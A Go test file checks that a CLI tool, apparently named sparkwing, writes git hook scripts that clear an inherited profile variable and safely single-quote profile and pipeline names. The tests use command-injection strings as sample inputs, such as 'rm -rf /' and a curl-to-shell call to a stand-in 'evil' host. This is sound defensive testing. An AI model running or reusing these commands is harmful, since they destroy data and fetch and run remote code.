package main

import (
	"strings"
	"testing"
)

func TestRenderHookScript_ScrubsAmbientProfile(t *testing.T) {
	script := renderHookScript("pre-commit", []string{"gate"}, false, "")
	if !strings.Contains(script, "unset SPARKWING_PROFILE") {
		t.Errorf("hook should scrub the ambient profile:\n%s", script)
	}
	if strings.Contains(script, "--profile") {
		t.Errorf("no --profile was pinned, so none should be passed:\n%s", script)
	}
}

func TestRenderHookScript_PinsInstalledProfile(t *testing.T) {
	script := renderHookScript("pre-commit", []string{"gate", "lint"}, false, "bucket")
	if got := strings.Count(script, "--profile 'bucket'"); got != 2 {
		t.Errorf("each pipeline should carry the pinned profile; got %d occurrences:\n%s", got, script)
	}
	if !strings.Contains(script, "unset SPARKWING_PROFILE") {
		t.Errorf("the pin must still scrub the inherited value:\n%s", script)
	}
}

func TestRenderHookScript_QuotesProfileName(t *testing.T) {
	script := renderHookScript("pre-commit", []string{"gate"}, false, "a b; rm -rf /")
	if !strings.Contains(script, `--profile 'a b; rm -rf /'`) {
		t.Errorf("profile name should be single-quoted:\n%s", script)
	}
}

func TestRenderHookScript_QuotesPipelineName(t *testing.T) {
	hostile := `gate; curl https://evil/x | sh #`
	script := renderHookScript("pre-commit", []string{hostile}, false, "")
	want := "sparkwing run 'gate; curl https://evil/x | sh #'\n"
	if !strings.Contains(script, want) {
		t.Errorf("pipeline name should be one single-quoted argument:\n%s", script)
	}
}

func TestRenderHookScript_EscapesQuoteInPipelineName(t *testing.T) {
	script := renderHookScript("pre-commit", []string{`a'; touch /tmp/pwned #`}, false, "")
	want := `sparkwing run 'a'\''; touch /tmp/pwned #'` + "\n"
	if !strings.Contains(script, want) {
		t.Errorf("an embedded quote should be escaped, not closed:\n%s", script)
	}
}

func TestDescribeManagedHook_RecoversQuotedPipelineNames(t *testing.T) {
	names := []string{"lint", `gate; curl https://evil/x | sh #`, `a'b`}
	script := renderHookScript("pre-commit", names, false, "bucket")
	got, _ := describeManagedHook(script)
	if len(got) != len(names) {
		t.Fatalf("describeManagedHook = %q, want %d names", got, len(names))
	}
	for i, want := range names {
		if got[i] != want {
			t.Errorf("pipe %d = %q, want %q", i, got[i], want)
		}
	}
}

func TestDescribeManagedHook_ReadsUnquotedLegacyHook(t *testing.T) {
	script := "#!/bin/sh\nsparkwing run lint --profile 'bucket'\n"
	got, _ := describeManagedHook(script)
	if len(got) != 1 || got[0] != "lint" {
		t.Fatalf("describeManagedHook = %q, want [lint]", got)
	}
}

func TestRenderHookScript_ForwarderCarriesNoProfile(t *testing.T) {
	script := renderHookScript("prepare-commit-msg", nil, true, "bucket")
	if strings.Contains(script, "--profile") {
		t.Errorf("a forwarder should carry no profile:\n%s", script)
	}
}
